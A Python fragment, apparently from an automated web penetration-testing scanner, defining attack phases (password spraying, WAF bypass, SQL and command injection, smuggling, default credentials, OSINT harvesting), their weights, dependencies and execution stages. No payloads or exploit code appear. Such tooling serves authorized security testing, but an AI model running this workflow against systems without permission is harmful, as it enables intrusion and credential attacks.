    ("70-PORTFULL", phase_70_PORTFULL, ("outdir", "t", "only", "skip", "prev", "force")),
    ("71-EMHARVEST", phase_71_EMHARVEST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("72-ACCOUNTENUM", phase_72_ACCOUNTENUM, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("73-CSPBYPASS", phase_73_CSPBYPASS, ("outdir", "t", "only", "skip", "force")),
    ("74-GHTOOLS", phase_74_GHTOOLS, ("domain", "outdir", "t", "only", "skip", "force")),
    ("75-MOBILEAPI", phase_75_MOBILEAPI, ("domain", "outdir", "t", "only", "skip", "force")),
    ("76-WORKFLOW", phase_76_WORKFLOW, ("outdir", "t", "only", "skip", "prev", "force")),
    ("77-CACHEKEY", phase_77_CACHEKEY, ("outdir", "t", "only", "skip", "prev", "force")),
    ("78-FILEUPLOADADV", phase_78_FILEUPLOADADV, ("outdir", "t", "only", "skip", "prev", "force")),
    ("79-SECRETDIFF", phase_79_SECRETDIFF, ("outdir", "t", "only", "skip", "force")),
    ("80-STOREXSS", phase_80_STOREXSS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("81-IDORFUZZ", phase_81_IDORFUZZ, ("outdir", "t", "only", "skip", "prev", "force")),
    ("82-OAUTHDEEP", phase_82_OAUTHDEEP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("83-RACEBURST", phase_83_RACEBURST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("84-WHOIS", phase_84_WHOIS, ("domain", "outdir", "t", "only", "skip", "force")),
    ("85-ASN", phase_85_ASN, ("domain", "outdir", "t", "only", "skip", "force")),
    ("86-DORK", phase_86_DORK, ("domain", "outdir", "t", "only", "skip", "force")),
    ("87-SHODAN", phase_87_SHODAN, ("domain", "outdir", "t", "only", "skip", "force")),
    ("88-EMPLOYEE", phase_88_EMPLOYEE, ("domain", "outdir", "t", "only", "skip", "force")),
    ("89-PASSIVEDNS", phase_89_PASSIVEDNS, ("domain", "outdir", "t", "only", "skip", "force")),
    ("90-CSRF", phase_90_CSRF, ("outdir", "t", "only", "skip", "prev", "force")),
    ("91-SESSIONFIX", phase_91_SESSIONFIX, ("outdir", "t", "only", "skip", "prev", "force")),
    ("92-SAML", phase_92_SAML, ("outdir", "t", "only", "skip", "prev", "force")),
    ("93-PWDSPRAY", phase_93_PWDSPRAY, ("outdir", "t", "only", "skip", "prev", "force")),
    ("94-COOKIEAUDIT", phase_94_COOKIEAUDIT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("95-POSTTEST", phase_95_POSTTEST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("96-METHODOVERRIDE", phase_96_METHODOVERRIDE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("97-FORCEDBROWSE", phase_97_FORCEDBROWSE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("98-CASEBYPASS", phase_98_CASEBYPASS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99-APIPAGE", phase_99_APIPAGE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99a-TABNAB", phase_99a_TABNAB, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99b-APIKEYLEAK", phase_99b_APIKEYLEAK, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99c-REDIRABUSE", phase_99c_REDIRABUSE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99d-LOGTRIGGER", phase_99d_LOGTRIGGER, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99e-XSSSTORED", phase_99e_XSSSTORED, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99f-HOSTABUSE", phase_99f_HOSTABUSE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("99g-AUTHBYPASSADV", phase_99g_AUTHBYPASSADV, ("outdir", "t", "only", "skip", "prev", "force")),
    ("100-SSI", phase_100_SSI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("101-JSONINJECT", phase_101_JSONINJECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("102-NULLBYTE", phase_102_NULLBYTE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("103-DOUBLEENCOD", phase_103_DOUBLEENCOD, ("outdir", "t", "only", "skip", "prev", "force")),
    ("104-UNICODE", phase_104_UNICODE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("105-POSTMSGXSS", phase_105_POSTMSGXSS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("106-JSONP", phase_106_JSONP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("107-SRI", phase_107_SRI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("108-MIXEDCONTENT", phase_108_MIXEDCONTENT, ("outdir", "t", "only", "skip", "force")),
    ("109-HSTSPRELOAD", phase_109_HSTSPRELOAD, ("outdir", "t", "only", "skip", "force")),
    ("110-THIRDPARTYJS", phase_110_THIRDPARTYJS, ("outdir", "t", "only", "skip", "force")),
    ("111-BROWSERSTORAGE", phase_111_BROWSERSTORAGE, ("outdir", "t", "only", "skip", "force")),
    ("112-RFI", phase_112_RFI, ("outdir", "t", "only", "skip", "prev", "force")),
    ("113-WEBDAV", phase_113_WEBDAV, ("outdir", "t", "only", "skip", "force")),
    ("114-SNMP", phase_114_SNMP, ("outdir", "t", "only", "skip", "force")),
    ("115-BANNER", phase_115_BANNER, ("outdir", "t", "only", "skip", "prev", "force")),
    ("116-PHPINFO", phase_116_PHPINFO, ("outdir", "t", "only", "skip", "prev", "force")),
    ("117-SRVSTATUS", phase_117_SRVSTATUS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("118-ERRORLEAK", phase_118_ERRORLEAK, ("outdir", "t", "only", "skip", "prev", "force")),
    ("119-WILDCARDDNS", phase_119_WILDCARDDNS, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("120-DNSREBIND", phase_120_DNSREBIND, ("domain", "outdir", "t", "only", "skip", "prev", "force")),
    ("121-IISASPNET", phase_121_IISASPNET, ("outdir", "t", "only", "skip", "prev", "force")),
    ("122-TOMCAT", phase_122_TOMCAT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("123-NODEJS", phase_123_NODEJS, ("outdir", "t", "only", "skip", "prev", "force")),
    ("124-LARAVEL", phase_124_LARAVEL, ("outdir", "t", "only", "skip", "prev", "force")),
    ("125-DJANGO", phase_125_DJANGO, ("outdir", "t", "only", "skip", "prev", "force")),
    ("126-SYMFONY", phase_126_SYMFONY, ("outdir", "t", "only", "skip", "prev", "force")),
    ("127-CICD", phase_127_CICD, ("outdir", "t", "only", "skip", "prev", "force")),
    ("128-DOCKER", phase_128_DOCKER, ("outdir", "t", "only", "skip", "prev", "force")),
    ("129-K8S", phase_129_K8S, ("outdir", "t", "only", "skip", "prev", "force")),
    ("130-TERRAFORM", phase_130_TERRAFORM, ("outdir", "t", "only", "skip", "prev", "force")),
    ("131-ENVDEEP", phase_131_ENVDEEP, ("outdir", "t", "only", "skip", "prev", "force")),
    ("132-GQLABUSE", phase_132_GQLABUSE, ("outdir", "t", "only", "skip", "prev", "force")),
    ("133-APIVERSION", phase_133_APIVERSION, ("outdir", "t", "only", "skip", "prev", "force")),
    ("134-LBDETECT", phase_134_LBDETECT, ("outdir", "t", "only", "skip", "prev", "force")),
    ("135-VHOST", phase_135_VHOST, ("outdir", "t", "only", "skip", "prev", "force")),
    ("136-RATELIMITBYPASS", phase_136_RATELIMITBYPASS, ("outdir", "t", "only", "skip", "prev", "force")),
]
# Phase weights for progress bar accuracy (heuristic based on typical runtime).
# Heavier phases (subdomain enum, port scan, nuclei, sqlmap, fuzz) contribute
# more to the bar so it doesn't jump to 50% after 5 quick phases then stall.
_PHASE_WEIGHTS: Dict[str, int] = {
    "00-SCOPE": 1,
    "01-RECON": 10,
    "02-RESOLVE": 5,
    "03-PERMUTE": 8,
    "04-SCAN": 10,
    "04b-TAKEOVER-VALIDATE": 3,
    "05-HARVEST": 8,
    "05b-APISPEC": 2,
    "06-JSINTEL": 5,
    "07-PARAMS": 5,
    "08-FUZZ": 10,
    "09-VULNSCAN": 10,
    "10-TLSCMS": 8,
    "11-INJECT": 8,
    "11a-DOMXSS": 6,
    "11b-SQLMAP": 10,
    "12-SSTI": 3,
    "13-OOB": 2,
    "14-ORIGIN": 3,
    "15-SECRETS": 5,
    "16a-AUTHZ": 2,
    "16b-MASSASSIGN": 2,
    "17-IDOR": 3,
    "17b-SSRFMETA": 2,
    "18-CLOUD": 3,
    "19-GIT": 5,
    "20-GRAPHQL": 2,
    "21-WAF": 3,
    "21b-WAFBYPASS": 4,
    "22-NOSQLI": 3,
    "23-RACE": 3,
    "24-JWT": 3,
    "25-XXE": 3,
    "26-CMDINJECT": 5,
    "27-SSPP": 2,
    "28-CACHED": 3,
    "29-DEPCHECK": 5,
    "30-LFI": 3,
    "31-OPENREDIR": 2,
    "32-CLICKJACK": 3,
    "33-CRLF": 3,
    "34-RATELIMIT": 2,
    "35-CORSADV": 3,
    "36-JWTADV": 3,
    "37-FILEUPLOAD": 3,
    "38-SMUGGLE": 5,
    "38b-H2SMUGGLE": 4,
    "39-OAUTH": 3,
    "40-PWRESET": 3,
    "41-WEBSOCKET": 3,
    "42-LDAP": 2,
    "43-DESERIAL": 3,
    "44-CHAIN": 1,
    "45-EVIDENCE": 3,
    "46-BUCKET": 3,
    "47-CDN": 2,
    "48-CONTENT": 5,
    "49-FRAMEWORKS": 4,
    "50-BUCKET-PERMS": 3,
    "51-HPP": 3,
    "52-SERVERLESS": 4,
    "53-CSP": 2,
    "54-WS-FUZZ": 3,
    "55-CSV-INJECT": 3,
    "56-EXPOSED-DB": 4,
    "57-DEFAULT-CREDS": 4,
    "58-HOST-INJECT": 3,
    "59-EMAIL-SEC": 2,
    "60-SMTP-ENUM": 3,
    "61-OAUTH-ADV": 3,
    "62-LOG-INJECT": 3,
    "63-DOC-ATTACK": 4,
    "64-IDEMPOTENCY": 3,
    "65-SESSION": 2,
    "66-SSRF-FULL": 3,
    "67-PATHNORM": 2,
    "68-DEPCVE": 4,
    "69-DNSZT": 1,
    "70-PORTFULL": 8,
    "71-EMHARVEST": 3,
    "72-ACCOUNTENUM": 2,
    "73-CSPBYPASS": 2,
    "74-GHTOOLS": 3,
    "75-MOBILEAPI": 2,
    "76-WORKFLOW": 2,
    "77-CACHEKEY": 2,
    "78-FILEUPLOADADV": 2,
    "79-SECRETDIFF": 1,
    "80-STOREXSS": 4,
    "81-IDORFUZZ": 3,
    "82-OAUTHDEEP": 2,
    "83-RACEBURST": 3,
    "84-WHOIS": 2,
    "85-ASN": 3,
    "86-DORK": 4,
    "87-SHODAN": 3,
    "88-EMPLOYEE": 2,
    "89-PASSIVEDNS": 3,
    "90-CSRF": 4,
    "91-SESSIONFIX": 3,
    "92-SAML": 3,
    "93-PWDSPRAY": 4,
    "94-COOKIEAUDIT": 3,
    "95-POSTTEST": 4,
    "96-METHODOVERRIDE": 3,
    "97-FORCEDBROWSE": 4,
    "98-CASEBYPASS": 3,
    "99-APIPAGE": 3,
    "99a-TABNAB": 2,
    "99b-APIKEYLEAK": 4,
    "99c-REDIRABUSE": 3,
    "99d-LOGTRIGGER": 2,
    "99e-XSSSTORED": 4,
    "99f-HOSTABUSE": 3,
    "99g-AUTHBYPASSADV": 4,
    "100-SSI": 3,
    "101-JSONINJECT": 3,
    "102-NULLBYTE": 2,
    "103-DOUBLEENCOD": 3,
    "104-UNICODE": 3,
    "105-POSTMSGXSS": 2,
    "106-JSONP": 2,
    "107-SRI": 2,
    "108-MIXEDCONTENT": 2,
    "109-HSTSPRELOAD": 2,
    "110-THIRDPARTYJS": 3,
    "111-BROWSERSTORAGE": 2,
    "112-RFI": 3,
    "113-WEBDAV": 3,
    "114-SNMP": 4,
    "115-BANNER": 2,
    "116-PHPINFO": 2,
    "117-SRVSTATUS": 2,
    "118-ERRORLEAK": 3,
    "119-WILDCARDDNS": 1,
    "120-DNSREBIND": 1,
    "121-IISASPNET": 3,
    "122-TOMCAT": 3,
    "123-NODEJS": 3,
    "124-LARAVEL": 3,
    "125-DJANGO": 3,
    "126-SYMFONY": 3,
    "127-CICD": 3,
    "128-DOCKER": 3,
    "129-K8S": 3,
    "130-TERRAFORM": 3,
    "131-ENVDEEP": 3,
    "132-GQLABUSE": 3,
    "133-APIVERSION": 3,
    "134-LBDETECT": 3,
    "135-VHOST": 3,
    "136-RATELIMITBYPASS": 3,
}
# Dependency graph: each phase lists the phases it directly depends on.
# A phase starts as soon as ALL its dependencies have completed, allowing
# the DAG scheduler to run phases concurrently without stage boundaries.
PHASE_DEPS: Dict[str, Set[str]] = {
    # ── Root phases (no deps, self-contained) ──────────────────────────────
    "00-SCOPE": set(),
    "01-RECON": set(),
    "13-OOB": set(),
    "44-CHAIN": set(),
    "59-EMAIL-SEC": set(),
    "69-DNSZT": set(),
    "84-WHOIS": set(),
    "85-ASN": set(),
    "86-DORK": set(),
    "87-SHODAN": set(),
    "88-EMPLOYEE": set(),
    "89-PASSIVEDNS": set(),
    # ── Read all_subs.txt from 01-RECON ────────────────────────────────────
    "02-RESOLVE": {"01-RECON"},
    "03-PERMUTE": {"01-RECON"},
    # ── Read resolved.txt / hosts.txt from 02-RESOLVE ──────────────────────
    "04-SCAN": {"02-RESOLVE"},
    "14-ORIGIN": {"02-RESOLVE"},
    "18-CLOUD": {"02-RESOLVE"},
    "19-GIT": {"02-RESOLVE"},
    "20-GRAPHQL": {"02-RESOLVE"},
    "21-WAF": {"02-RESOLVE"},
    "52-SERVERLESS": {"02-RESOLVE"},
    "53-CSP": {"02-RESOLVE"},
    "60-SMTP-ENUM": {"02-RESOLVE"},
    "108-MIXEDCONTENT": {"02-RESOLVE"},
    "109-HSTSPRELOAD": {"02-RESOLVE"},
    "110-THIRDPARTYJS": {"02-RESOLVE"},
    "113-WEBDAV": {"02-RESOLVE"},
    "114-SNMP": {"02-RESOLVE"},
    # ── Read takeover / host-targets / ports from 04-SCAN ──────────────────
    "04b-TAKEOVER-VALIDATE": {"04-SCAN"},
    "05-HARVEST": {"04-SCAN"},
    "70-PORTFULL": {"04-SCAN"},
    "73-CSPBYPASS": {"04-SCAN"},
    # ── Read urls_all.txt / host_targets.txt / tech.txt from 05-HARVEST ────
    #   (most injection, auth, and check phases consume these)
    "05b-APISPEC": {"05-HARVEST"},
    "06-JSINTEL": {"05-HARVEST"},
    "07-PARAMS": {"05-HARVEST"},
    "08-FUZZ": {"05-HARVEST"},
    "09-VULNSCAN": {"05-HARVEST"},
    "10-TLSCMS": {"05-HARVEST"},
    "11-INJECT": {"05-HARVEST"},
    "11a-DOMXSS": {"05-HARVEST"},
    "12-SSTI": {"05-HARVEST"},
    "16a-AUTHZ": {"05-HARVEST", "08-FUZZ"},
    "16b-MASSASSIGN": {"05-HARVEST", "08-FUZZ"},
    "17-IDOR": {"05-HARVEST"},
    "22-NOSQLI": {"05-HARVEST"},
    "23-RACE": {"05-HARVEST"},
    "24-JWT": {"05-HARVEST"},
    "25-XXE": {"05-HARVEST"},
    "26-CMDINJECT": {"05-HARVEST"},
    "27-SSPP": {"05-HARVEST"},
    "28-CACHED": {"05-HARVEST"},
    "29-DEPCHECK": {"05-HARVEST"},
    "30-LFI": {"05-HARVEST"},
    "31-OPENREDIR": {"05-HARVEST"},
    "32-CLICKJACK": {"05-HARVEST"},
    "33-CRLF": {"05-HARVEST"},
    "34-RATELIMIT": {"05-HARVEST"},
    "35-CORSADV": {"05-HARVEST"},
    "37-FILEUPLOAD": {"05-HARVEST"},
    "38-SMUGGLE": {"05-HARVEST"},
    "38b-H2SMUGGLE": {"05-HARVEST"},
    "40-PWRESET": {"05-HARVEST"},
    "41-WEBSOCKET": {"05-HARVEST"},
    "42-LDAP": {"05-HARVEST"},
    "43-DESERIAL": {"05-HARVEST"},
    "46-BUCKET": {"05-HARVEST"},
    "47-CDN": {"05-HARVEST"},
    "48-CONTENT": {"05-HARVEST"},
    "49-FRAMEWORKS": {"05-HARVEST"},
    "51-HPP": {"05-HARVEST"},
    "54-WS-FUZZ": {"05-HARVEST"},
    "55-CSV-INJECT": {"05-HARVEST"},
    "56-EXPOSED-DB": {"05-HARVEST"},
    "57-DEFAULT-CREDS": {"05-HARVEST"},
    "58-HOST-INJECT": {"05-HARVEST"},
    "61-OAUTH-ADV": {"05-HARVEST"},
    "62-LOG-INJECT": {"05-HARVEST"},
    "63-DOC-ATTACK": {"05-HARVEST"},
    "64-IDEMPOTENCY": {"05-HARVEST"},
    "65-SESSION": {"05-HARVEST"},
    "66-SSRF-FULL": {"05-HARVEST"},
    "67-PATHNORM": {"05-HARVEST"},
    "68-DEPCVE": {"05-HARVEST"},
    "71-EMHARVEST": {"05-HARVEST"},
    "72-ACCOUNTENUM": {"05-HARVEST"},
    "74-GHTOOLS": {"05-HARVEST"},
    "75-MOBILEAPI": {"05-HARVEST"},
    "76-WORKFLOW": {"05-HARVEST"},
    "77-CACHEKEY": {"05-HARVEST"},
    "78-FILEUPLOADADV": {"05-HARVEST"},
    "80-STOREXSS": {"05-HARVEST"},
    "81-IDORFUZZ": {"05-HARVEST"},
    "82-OAUTHDEEP": {"05-HARVEST"},
    "83-RACEBURST": {"05-HARVEST"},
    "90-CSRF": {"05-HARVEST"},
    "91-SESSIONFIX": {"05-HARVEST"},
    "92-SAML": {"05-HARVEST"},
    "93-PWDSPRAY": {"05-HARVEST"},
    "94-COOKIEAUDIT": {"05-HARVEST"},
    "95-POSTTEST": {"05-HARVEST"},
    "96-METHODOVERRIDE": {"05-HARVEST"},
    "97-FORCEDBROWSE": {"05-HARVEST"},
    "98-CASEBYPASS": {"05-HARVEST"},
    "99-APIPAGE": {"05-HARVEST"},
    "99a-TABNAB": {"05-HARVEST"},
    "99b-APIKEYLEAK": {"05-HARVEST"},
    "99c-REDIRABUSE": {"05-HARVEST"},
    "99d-LOGTRIGGER": {"05-HARVEST"},
    "99e-XSSSTORED": {"05-HARVEST"},
    "99f-HOSTABUSE": {"05-HARVEST"},
    "99g-AUTHBYPASSADV": {"05-HARVEST"},
    "100-SSI": {"05-HARVEST"},
    "101-JSONINJECT": {"05-HARVEST"},
    "102-NULLBYTE": {"05-HARVEST"},
    "103-DOUBLEENCOD": {"05-HARVEST"},
    "104-UNICODE": {"05-HARVEST"},
    "105-POSTMSGXSS": {"05-HARVEST"},
    "106-JSONP": {"05-HARVEST"},
    "107-SRI": {"05-HARVEST"},
    "108-MIXEDCONTENT": {"05-HARVEST"},
    "109-HSTSPRELOAD": {"05-HARVEST"},
    "110-THIRDPARTYJS": {"05-HARVEST"},
    "111-BROWSERSTORAGE": {"05-HARVEST"},
    "112-RFI": {"05-HARVEST"},
    "113-WEBDAV": {"05-HARVEST"},
    "114-SNMP": {"05-HARVEST"},
    "115-BANNER": {"05-HARVEST"},
    "116-PHPINFO": {"05-HARVEST"},
    "117-SRVSTATUS": {"05-HARVEST"},
    "118-ERRORLEAK": {"05-HARVEST"},
    "119-WILDCARDDNS": {"05-HARVEST"},
    "120-DNSREBIND": {"05-HARVEST"},
    "121-IISASPNET": {"05-HARVEST"},
    "122-TOMCAT": {"05-HARVEST"},
    "123-NODEJS": {"05-HARVEST"},
    "124-LARAVEL": {"05-HARVEST"},
    "125-DJANGO": {"05-HARVEST"},
    "126-SYMFONY": {"05-HARVEST"},
    "127-CICD": {"05-HARVEST"},
    "128-DOCKER": {"05-HARVEST"},
    "129-K8S": {"05-HARVEST"},
    "130-TERRAFORM": {"05-HARVEST"},
    "131-ENVDEEP": {"05-HARVEST"},
    "132-GQLABUSE": {"05-HARVEST"},
    "133-APIVERSION": {"05-HARVEST"},
    "134-LBDETECT": {"05-HARVEST"},
    "135-VHOST": {"05-HARVEST"},
    "136-RATELIMITBYPASS": {"05-HARVEST"},
    # ── Needs 07-PARAMS (enriched params from paramspider) ──────────────────
    "11b-SQLMAP": {"07-PARAMS"},
    # ── Needs 06-JSINTEL JS-analysis output ────────────────────────────────
    "15-SECRETS": {"06-JSINTEL"},
    # ── Specific cross-phase deps ──────────────────────────────────────────
    "17b-SSRFMETA": {"11-INJECT"},
    "21b-WAFBYPASS": {"21-WAF"},
    "36-JWTADV": {"24-JWT"},
    "39-OAUTH": {"36-JWTADV"},
    "45-EVIDENCE": {"44-CHAIN"},
    "50-BUCKET-PERMS": {"18-CLOUD"},
    "79-SECRETDIFF": {"15-SECRETS"},
}
# Dependency-ordered execution stages. Phases in the same stage are independent
# of one another (they only read artifacts produced by *earlier* stages, never
# each other's output), so they run concurrently.
# Stage 0 — Discovery: subdomains, DNS, ports (streaming)
# Stage 1 — DNS resolution after subdomain discovery
# Later stages keep producer artifacts in earlier stages than their consumers.
# Note: STAGES is kept for backward compatibility; the DAG scheduler uses PHASE_DEPS.
STAGES: List[List[str]] = [
    # Stage 0 — Scope validation (must complete before any discovery)
    ["00-SCOPE"],
    # Stage 0a — Subdomain enumeration (consumes scope_validated.txt from Stage 0)
    ["01-RECON"],
    # Stage 1 — DNS resolution (needs 01-RECON output, which Stage 0 guarantees)
    ["02-RESOLVE"],
    # Stage 2 — Port scanning, WAF detection, subdomain permutation (need resolved hosts/subs)
    ["04-SCAN", "21-WAF", "03-PERMUTE"],
    # Stage 2a — DNS zone transfer (needs domain, no host dependency)
    ["69-DNSZT"],
    # Stage 2b — OSINT/recon phases (need domain only, independent of each other)
    ["84-WHOIS", "85-ASN", "86-DORK", "87-SHODAN", "88-EMPLOYEE", "89-PASSIVEDNS"],
    # Stage 3 — Harvest URLs and validate takeover candidates emitted by 04-SCAN
    ["05-HARVEST", "04b-TAKEOVER-VALIDATE"],
    # Stage 4 — URL consumers: API spec hunting and JS URL extraction need harvested URLs
    ["05b-APISPEC", "06-JSINTEL"],
    # Stage 5 — Deep JS secret/dependency prep needs urls_js.txt from 06-JSINTEL
    ["15-SECRETS"],
    # Stage 6 — Parameter discovery after JS intel/deep secret phases can enrich urls_all.txt
    ["07-PARAMS"],
    # Stage 7 — Fuzzing (throttled by WAF profile)
    ["08-FUZZ"],
    # Stage 8 — Independent parallel scans that don't need parameter corpus
    ["09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "18-CLOUD", "19-GIT", "20-GRAPHQL", "68-DEPCVE", "71-EMHARVEST"],
    # Stage 9 — Main injection cluster: all consume parameter corpus, run concurrently
    ["11-INJECT", "11a-DOMXSS", "11b-SQLMAP", "12-SSTI", "22-NOSQLI", "25-XXE", "26-CMDINJECT", "27-SSPP", "42-LDAP", "43-DESERIAL"],
    # Stage 10 — SSRF follow-up (triggers on confirmed SSRF from 11-INJECT)
    ["17b-SSRFMETA"],
    # Stage 11 — Auth-focused cluster
    ["24-JWT", "36-JWTADV", "72-ACCOUNTENUM"],
    # Stage 12 — Auth tests: consume JWT findings + params from earlier stages
    ["39-OAUTH", "40-PWRESET", "16a-AUTHZ", "16b-MASSASSIGN", "17-IDOR", "81-IDORFUZZ", "82-OAUTHDEEP"],
    # Stage 13 — Long tail of independent checks (WAF-BYPASS needs 21-WAF results)
    ["28-CACHED", "29-DEPCHECK", "30-LFI", "31-OPENREDIR", "32-CLICKJACK", "33-CRLF", "34-RATELIMIT", "35-CORSADV", "37-FILEUPLOAD", "38-SMUGGLE", "38b-H2SMUGGLE", "41-WEBSOCKET", "21b-WAFBYPASS", "67-PATHNORM", "73-CSPBYPASS", "74-GHTOOLS", "75-MOBILEAPI", "76-WORKFLOW", "77-CACHEKEY", "78-FILEUPLOADADV", "80-STOREXSS"],
    # Stage 14 — OOB callback collection + SSRF testing with OOB
    ["13-OOB", "23-RACE", "66-SSRF-FULL", "83-RACEBURST"],
    # Stage 15 — Cross-phase correlation
    ["44-CHAIN"],
    # Stage 16 — Evidence capture after correlation has written its findings
    ["45-EVIDENCE"],
    # Stage 17 — Enhancement phases: cloud/CDN/framework/idempotency
    ["46-BUCKET", "47-CDN", "48-CONTENT", "49-FRAMEWORKS", "64-IDEMPOTENCY", "65-SESSION", "70-PORTFULL"],
    # Stage 18 — Enhancement phases v2: bucket perms + serverless + CSP + exposed DB + default creds + secret diff
    ["50-BUCKET-PERMS", "52-SERVERLESS", "53-CSP", "56-EXPOSED-DB", "57-DEFAULT-CREDS", "59-EMAIL-SEC", "79-SECRETDIFF"],
    # Stage 19 — Injection/param-based phases: HPP, CSV, log inject need url params
    ["51-HPP", "55-CSV-INJECT", "62-LOG-INJECT", "58-HOST-INJECT"],
    # Stage 20 — WebSocket fuzzing, OAuth adv, SMTP enum, doc attack
    ["54-WS-FUZZ", "61-OAUTH-ADV", "60-SMTP-ENUM", "63-DOC-ATTACK"],
    # Stage 21 — Auth/session/access control bypass deep testing
    ["90-CSRF", "91-SESSIONFIX", "92-SAML", "93-PWDSPRAY", "94-COOKIEAUDIT",
     "95-POSTTEST", "96-METHODOVERRIDE", "97-FORCEDBROWSE", "98-CASEBYPASS",
     "99-APIPAGE", "99a-TABNAB", "99b-APIKEYLEAK", "99c-REDIRABUSE",
     "99d-LOGTRIGGER", "99e-XSSSTORED", "99f-HOSTABUSE", "99g-AUTHBYPASSADV"],
    # Stage 22 — Injection, client-side, and infrastructure testing
    ["100-SSI", "101-JSONINJECT", "102-NULLBYTE", "103-DOUBLEENCOD", "104-UNICODE",
     "105-POSTMSGXSS", "106-JSONP", "107-SRI", "108-MIXEDCONTENT", "109-HSTSPRELOAD",
     "110-THIRDPARTYJS", "111-BROWSERSTORAGE", "112-RFI", "113-WEBDAV", "114-SNMP",
     "115-BANNER", "116-PHPINFO", "117-SRVSTATUS", "118-ERRORLEAK",
     "119-WILDCARDDNS", "120-DNSREBIND"],
    # Stage 23 — CMS/framework/cloud/DevOps exposure testing
    ["121-IISASPNET", "122-TOMCAT", "123-NODEJS", "124-LARAVEL", "125-DJANGO", "126-SYMFONY",
     "127-CICD", "128-DOCKER", "129-K8S", "130-TERRAFORM", "131-ENVDEEP",
     "132-GQLABUSE", "133-APIVERSION", "134-LBDETECT", "135-VHOST", "136-RATELIMITBYPASS"],
]


_RECON_LEVELS = {
    "1": {
        "name": "Basic reconnaissance",
        "desc": "Scope → Subs → DNS → Ports/HTTP → URLs → Report (fast, no vuln scanning)",
        "phases": {"00-SCOPE", "01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST"},
    },
    "2": {
        "name": "Standard assessment",
        "desc": "Basic + sub perms + JS secrets + params + fuzzing + nuclei + TLS + origin IP + JWT + cache + rate-limit + WebSocket",
        "phases": {"00-SCOPE", "01-RECON", "02-RESOLVE", "03-PERMUTE", "04-SCAN", "05-HARVEST", "06-JSINTEL", "07-PARAMS", "08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "14-ORIGIN", "24-JWT", "28-CACHED", "34-RATELIMIT", "41-WEBSOCKET"},
    },
    "full": {
        "name": "Full audit",
        "desc": "All 152 phases — every recon + injection + auth/session/access bypass + client-side + infrastructure + CMS/framework + cloud/DevOps + correlation + evidence + advanced probes",
        "phases": VALID_PHASES,
    },
}
